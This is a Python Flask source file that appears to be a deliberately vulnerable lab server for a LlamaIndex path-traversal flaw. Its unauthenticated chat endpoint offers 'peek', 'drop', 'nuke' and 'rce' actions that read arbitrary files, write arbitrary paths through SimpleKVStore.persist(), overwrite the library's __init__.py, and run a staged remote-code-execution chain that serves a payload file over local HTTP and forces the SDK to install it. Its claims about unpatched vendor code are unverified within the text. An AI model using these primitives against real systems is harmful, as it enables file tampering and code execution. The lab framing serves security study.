"""
Vulnerable LlamaIndex API Server - Multi-Stage (Strict SDK Verification)
Exposes CWE-22 path traversal strictly through LlamaIndex SDK sinks.

Reference: JDP-2026-003
"""

import functools
import http.server
import inspect
import json
import os
import socketserver
import sys
import tempfile
import threading
from pathlib import Path

from flask import Flask, jsonify, request

app = Flask(__name__)

# Flush stdout immediately for container log streaming
sys.stdout.reconfigure(line_buffering=True)
sys.stderr.reconfigure(line_buffering=True)

LLAMA_DIR = "/usr/local/lib/python3.11/site-packages/llama_index/core"
LLAMA_INIT = os.path.join(LLAMA_DIR, "__init__.py")
SANDBOX_DIR = "/app/sandbox_data"
os.makedirs(SANDBOX_DIR, exist_ok=True)

LAB_STAGE = int(os.environ.get("LAB_STAGE", "0"))
COMPROMISED = False

# Unique marker used to verify that the SDK actually wrote our payload.
RCE_MARKER = "# JDP_RCE_PAYLOAD_EXECUTED"

# Import availability depends strictly on module state, not stage numbers
try:
    from llama_index.core.download.dataset import (
        download_dataset_and_source_files,
        download_llama_dataset,
    )

    DATASET_FUNCTIONS_AVAILABLE = True
except ImportError:
    DATASET_FUNCTIONS_AVAILABLE = False

try:
    from llama_index.core import StorageContext
    from llama_index.core.storage.kvstore import SimpleKVStore

    KVSTORE_AVAILABLE = True
except ImportError:
    KVSTORE_AVAILABLE = False


def _get_version():
    import importlib.metadata

    try:
        return importlib.metadata.version("llama-index-core")
    except Exception:
        return "unknown"


def verify_sdk_write_origin() -> bool:
    """
    Forensic audit helper: Verifies if the active call stack frame
    originated inside the genuine llama_index package execution path.
    """
    stack = inspect.stack()
    return any(
        ("llama_index" in frame.filename or "llama_index/core" in frame.filename)
        for frame in stack
    )


def _is_compromised():
    if not os.path.exists(LLAMA_INIT):
        return False
    try:
        with open(LLAMA_INIT, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
        return (
            ("LLAMAINDEX" in content and "NUKED" in content)
            or ("import os" in content and "getpass" in content)
            or content.strip().startswith("{")
            or RCE_MARKER in content
            or COMPROMISED
        )
    except Exception:
        return COMPROMISED


@app.route("/health")
def health():
    return jsonify(
        {
            "status": "compromised" if _is_compromised() else "ok",
            "llama_version": _get_version(),
            "stage": LAB_STAGE,
            "dataset_functions_available": DATASET_FUNCTIONS_AVAILABLE,
            "dataset_py_present": DATASET_FUNCTIONS_AVAILABLE,
            "sandbox_dir": SANDBOX_DIR,
            "init_integrity": "COMPROMISED" if _is_compromised() else "clean",
            "endpoints_available": [
                "/health",
                "/verify",
                "/migration",
                "/chat",
                "/agent/save_session",
            ],
        }
    )


@app.route("/verify")
def verify():
    if not os.path.exists(LLAMA_INIT):
        return jsonify({"status": "error", "file": LLAMA_INIT, "exists": False})

    try:
        with open(LLAMA_INIT, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
    except Exception as e:
        return jsonify({"status": "error", "file": LLAMA_INIT, "error": str(e)})

    markers = []
    impact_type = "clean"
    stripped = content.strip()

    if stripped.startswith("{"):
        markers.append("JSON OVERWRITE - DoS")
        impact_type = "dos_json"

    if "import os" in content and "getpass" in content:
        markers.append("RCE PAYLOAD DETECTED")
        impact_type = "rce_raw"

    if RCE_MARKER in content:
        markers.append("SDK RCE MARKER FOUND")
        impact_type = "rce_raw"

    if "PWNED" in content or "pwned" in content:
        markers.append("PERSISTENT COMPROMISE")
        impact_type = "rce_raw" if not stripped.startswith("{") else "dos_json"

    if stripped.startswith("{"):
        content_type = "json"
    elif "import " in content or "def " in content or "class " in content:
        content_type = "python"
    else:
        content_type = "unknown"

    clean = len(markers) == 0
    return jsonify(
        {
            "status": "clean" if clean else "compromised",
            "file": LLAMA_INIT,
            "exists": True,
            "clean": clean,
            "markers_found": markers,
            "size_bytes": len(content),
            "content_type": content_type,
            "impact": impact_type,
        }
    )


@app.route("/migration")
def migration():
    workflows_path = "not installed"
    candidate = "/usr/local/lib/python3.11/site-packages/workflows"
    if os.path.exists(candidate):
        workflows_path = candidate

    sinks_path = "not found"
    core_sinks = "/usr/local/lib/python3.11/site-packages/llama_index/core/ingestion/data_sinks.py"
    if os.path.exists(core_sinks):
        sinks_path = core_sinks

    kvstore_path = "not found"
    try:
        import llama_index.core.storage.kvstore

        kvstore_path = llama_index.core.storage.kvstore.__file__
    except Exception:
        pass

    return jsonify(
        {
            "stage": LAB_STAGE,
            "version": _get_version(),
            "original_dataset_py": "llama_index/core/download/dataset.py -> DELETED in v0.14.20 (routine cleanup)",
            "migrated_to_package": workflows_path,
            "data_sinks": {
                "path": sinks_path,
                "fixed": False,
                "note": "data_sinks.py was NEVER moved. PR #21251 was a genuine typo fix, NOT a security patch.",
            },
            "simple_kvstore": {
                "path": kvstore_path,
                "fixed": False,
                "note": "NEVER patched - still vulnerable in ALL versions.",
            },
            "verdict": "NO REMEDIATION - vendor deleted dataset.py as collateral cleanup, never patched SimpleKVStore.persist()",
        }
    )


@app.route("/chat", methods=["POST"])
def chat():
    data = request.get_json(force=True, silent=True) or {}
    query = data.get("query", "").strip() or data.get("message", "").strip()

    if not query:
        return jsonify(
            {
                "output": "No action provided. Use peek:<path>, drop:<path>:<content>, nuke:<payload>, rce:<payload>, check, stage, or migration"
            }
        )

    try:
        # Fixed parsing logic to prevent truncation of payloads containing colons
        if ":" in query:
            parts = query.split(":", 1)
            action = parts[0].strip().lower()
            remainder = parts[1].strip()
        else:
            action = query.strip().lower()
            remainder = ""

        if action == "peek":
            return jsonify({"output": _peek(remainder)})
        elif action == "drop":
            drop_parts = remainder.split(":", 1)
            path = drop_parts[0].strip()
            content = drop_parts[1].strip() if len(drop_parts) > 1 else ""
            return jsonify({"output": _drop(path, content)})
        elif action == "nuke":
            return jsonify(
                {"output": _nuke_dos(remainder if remainder else "print('PWNED')")}
            )
        elif action == "rce":
            return jsonify(
                {"output": _nuke_rce(remainder if remainder else "print('RCE')")}
            )
        elif action == "check":
            return jsonify({"output": json.dumps(verify().get_json(), indent=2)})
        elif action == "stage":
            return jsonify(
                {
                    "output": json.dumps(
                        {
                            "stage": LAB_STAGE,
                            "version": _get_version(),
                            "dataset_functions_available": DATASET_FUNCTIONS_AVAILABLE,
                            "dataset_py_present": DATASET_FUNCTIONS_AVAILABLE,
                            "SimpleKVStore_available": KVSTORE_AVAILABLE,
                            "SimpleKVStore_vulnerable": True,
                            "compromised": _is_compromised(),
                        },
                        indent=2,
                    )
                }
            )
        elif action == "migration":
            return jsonify({"output": json.dumps(migration().get_json(), indent=2)})
        else:
            return jsonify({"output": f"Unknown action: {action}"})

    except Exception as e:
        return jsonify({"output": f"[ERROR] {str(e)}"})


@app.route("/agent/save_session", methods=["POST"])
def agent_save_session():
    data = request.get_json(force=True, silent=True) or {}
    client_name = data.get("client_name", "").strip()
    persist_dir = data.get("persist_dir", "").strip()

    if not client_name and not persist_dir:
        return jsonify({"output": "No client_name or persist_dir provided."})

    target_dir = persist_dir if persist_dir else f"./workspaces/{client_name}"

    # Detect traversal on the ORIGINAL input, before prefixing.
    is_traversal = (
        client_name and (".." in client_name or client_name.startswith("/"))
    ) or (persist_dir and (".." in persist_dir or persist_dir.startswith("/")))

    try:
        from llama_index.core.graph_stores import SimpleGraphStore
        from llama_index.core.storage.docstore import SimpleDocumentStore
        from llama_index.core.storage.index_store import SimpleIndexStore
        from llama_index.core.vector_stores import SimpleVectorStore

        storage_context = StorageContext.from_defaults(
            docstore=SimpleDocumentStore(),
            index_store=SimpleIndexStore(),
            vector_store=SimpleVectorStore(),
            graph_store=SimpleGraphStore(),
        )
        storage_context.persist(persist_dir=target_dir)

        return jsonify(
            {
                "output": f"[AGENT] Session saved to {target_dir}",
                "target_path": target_dir,
                "vulnerability_demo": (
                    "Path traversal demonstrated!" if is_traversal else "Normal save."
                ),
                "sdk_origin_verified": verify_sdk_write_origin(),
            }
        )
    except Exception as e:
        return jsonify({"output": f"[ERROR] {str(e)}"})


def _peek(path):
    """
    Honest direct filesystem read.

    This is NOT the LlamaIndex SDK write primitive. The white paper's
    dataset.py sink is a write primitive, not a read primitive.
    """
    target_path = path.strip()

    try:
        if os.path.isfile(target_path):
            with open(target_path, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read(2048)
            return (
                f"[READ] {target_path}\n"
                f"[!] Direct OS File Read (Non-SDK Vector)\n"
                f"[--- CONTENTS ---]\n{content}"
            )
        elif os.path.isdir(target_path):
            files = os.listdir(target_path)
            return (
                f"[READ] {target_path}\n"
                f"[!] Direct OS Directory Read (Non-SDK Vector)\n"
                f"Contents: {', '.join(files[:20])}"
            )
        else:
            return f"[READ] {target_path}\n[!] Path not found."
    except Exception as e:
        return f"[READ] {target_path}\n[!] Read error: {str(e)}"


def _drop(path, content):
    global COMPROMISED
    try:
        kv = SimpleKVStore()
        kv.put("lab_payload", {"data": content})
        kv.persist(persist_path=path)

        if "__init__.py" in path:
            COMPROMISED = True

        return f"[DROP] SUCCESS: Written to {path} via SimpleKVStore.persist()"
    except Exception as e:
        return f"[DROP] ERROR: SimpleKVStore execution failed: {str(e)}"


def _nuke_dos(payload):
    global COMPROMISED
    COMPROMISED = True
    try:
        kv = SimpleKVStore()
        kv.put("exploit", {"code": payload})
        kv.persist(persist_path=LLAMA_INIT)

        return f"[NUKE-DoS] Framework file overwritten with JSON via SimpleKVStore.persist(): {LLAMA_INIT}"
    except Exception as e:
        return f"[NUKE-DoS] ERROR: {str(e)}"


def _nuke_rce(payload):
    global COMPROMISED

    if not DATASET_FUNCTIONS_AVAILABLE:
        return f"[RCE] Vector unavailable in Stage {LAB_STAGE} (dataset.py removed)."

    # 1. Create a malicious dataset with the user's payload.
    tmp_dir = tempfile.mkdtemp(prefix="llamaindex_rce_")

    dataset_root = os.path.join(tmp_dir, "llama_datasets", "exploit")
    os.makedirs(dataset_root, exist_ok=True)

    # Required base file (any content works)
    with open(
        os.path.join(dataset_root, "rag_dataset.json"), "w", encoding="utf-8"
    ) as f:
        f.write("{}")

    # The malicious source file
    core_dir = os.path.join(dataset_root, "core")
    os.makedirs(core_dir, exist_ok=True)
    with open(os.path.join(core_dir, "__init__.py"), "w", encoding="utf-8") as f:
        f.write(payload)
        f.write("\n")
        f.write(RCE_MARKER)
        f.write("\n")

    # 2. Serve the dataset over HTTP.
    handler = functools.partial(http.server.SimpleHTTPRequestHandler, directory=tmp_dir)

    httpd = socketserver.TCPServer(("127.0.0.1", 0), handler)
    port = httpd.server_address[1]
    thread = threading.Thread(target=httpd.serve_forever, daemon=True)
    thread.start()

    try:
        # 3. Force the SDK to re-download and overwrite.
        download_dataset_and_source_files(
            local_dir_path="/usr/local/lib/python3.11/site-packages/llama_index",
            remote_lfs_dir_path=f"http://127.0.0.1:{port}",
            source_files_dir_path="core",
            source_files=["__init__.py"],
            dataset_id="exploit",
            dataset_class_name="LabelledRagDataset",
            override_path=True,
            refresh_cache=True,
        )
    finally:
        httpd.shutdown()
        thread.join()

    # 4. Verify the marker was written by the SDK.
    with open(LLAMA_INIT, "r", encoding="utf-8", errors="ignore") as f:
        content = f.read()

    if RCE_MARKER in content:
        COMPROMISED = True
        return f"[RCE] Framework file overwritten via REAL SDK call: {LLAMA_INIT}"
    else:
        return (
            f"[RCE] SDK call finished, but marker {RCE_MARKER!r} was not found "
            f"in {LLAMA_INIT}."
        )


if __name__ == "__main__":
    print(f"[*] LlamaIndex sandbox starting...")
    print(f"[*] Stage: {LAB_STAGE}")
    print(f"[*] Version: {_get_version()}")
    print(f"[*] dataset.py functions available: {DATASET_FUNCTIONS_AVAILABLE}")
    print(f"[*] SimpleKVStore.persist() available: {KVSTORE_AVAILABLE}")
    print(f"[*] Sandbox: {SANDBOX_DIR}")
    print(f"[*] Target: {LLAMA_INIT}\n")
    app.run(host="0.0.0.0", port=8000)
